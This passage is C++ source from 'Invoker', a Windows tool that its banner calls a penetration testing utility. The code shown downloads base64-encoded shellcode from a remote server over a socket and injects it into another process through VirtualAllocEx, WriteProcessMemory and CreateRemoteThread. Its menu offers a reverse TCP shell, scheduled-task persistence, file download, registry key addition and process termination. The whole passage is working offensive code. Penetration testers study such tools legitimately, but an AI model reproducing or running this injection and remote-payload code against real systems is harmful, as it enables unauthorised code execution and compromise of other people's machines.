						if (p2 != std::string::npos) {
							data = data.substr(0, p2);
						}
						if (p1 == std::string::npos || p2 == std::string::npos) {
							printf("\nBytecode was not found or is empty\n\n");
							data.clear();
						} else {
							printf("\nBytecode was downloaded successfully\n\n");
							data = base64_decode(data);
						}
					}
					memset(&server, 0, sizeof(sockaddr_in));
				}
			}
			closesocket(s);
		}
		WSACleanup();
	}
	if (data.length() > 0) {
		system("Pause");
		int id = getProcessID();
		if (id != -1) {
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, id);
			if (hProcess == NULL) {
				printf("\nUnable to get the process handle\n\n");
			} else {
				PVOID addr = VirtualAllocEx(hProcess, NULL, strlen(data.c_str()), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
				if (addr == NULL) {
					printf("\nUnable to allocate the additional process memory\n\n");
				} else if (WriteProcessMemory(hProcess, addr, data.c_str(), strlen(data.c_str()), NULL) == 0) {
					printf("\nUnable to write to the process memory\n");
				} else if (CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) addr, NULL, 0, NULL) == NULL) {
					printf("\nUnable to start the process thread\n\n");
				} else {
					printf("\nBytecode was injected successfully\n\n");
				}
			}
			CloseHandle(hProcess);
		}
		data.clear();
	}
	system("Pause");
}

int main() {
	SetConsoleTitle("Invoker");
	std::string choice = "";
	do {
		system("CLS");
		printf("######################################################################\n");
		printf("#                                                                    #\n");
		printf("#                               Invoker                              #\n");
		printf("#                                  by Ivan Sincek                    #\n");
		printf("#                                                                    #\n");
		printf("# Penetration testing utility.                                       #\n");
		printf("# GitHub repository at github.com/ivan-sincek/invoker.               #\n");
		printf("# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14. #\n");
		printf("#                                                                    #\n");
		printf("######################################################################\n");
		printf("# ( 0) Exit                                                          #\n");
		printf("######################################################################\n");
		printf("# ( 1) [SYSTEM ]  Invoke CMD                                         #\n");
		printf("# ( 2) [SYSTEM ]  Invoke PS                                          #\n");
		printf("# ( 3) [MS WORD]  Invoke PS                                          #\n");
		printf("# ( 4) [PS     ]  Reverse TCP                                        #\n");
		printf("# ( 5) [PS     ]  Schedule Task                                      #\n");
		printf("# ( 6) [PS     ]  Download File                                      #\n");
		printf("# ( 7) [C++    ]  Download File                                      #\n");
		printf("# ( 8) [C++    ]  Add Registry Key                                   #\n");
		printf("# ( 9) [C++    ]  Terminate Process                                  #\n");
		printf("# (10) [C++    ]  Inject Bytecode                                    #\n");
		printf("######################################################################\n");
		printf("Your choice: ");
		getline(std::cin, choice);
		if (choice == "1") {
			systemInvokeCMD();
		} else if (choice == "2") {
			systemInvokePS();
		} else if (choice == "3") {
			wordInvokePS();
		} else if (choice == "4") {
			psReverseTCP();
		} else if (choice == "5") {
			psScheduleTask();
		} else if (choice == "6") {
			psDownloadFile();
		} else if (choice == "7") {
			cppDownloadFile();
		} else if (choice == "8") {
			cppAddRegistryKey();
		} else if (choice == "9") {
			cppTerminateProcess();
		} else if (choice == "10") {
			cppInjectBytecode();
		}
	} while (choice != "0");
	return 0;
}

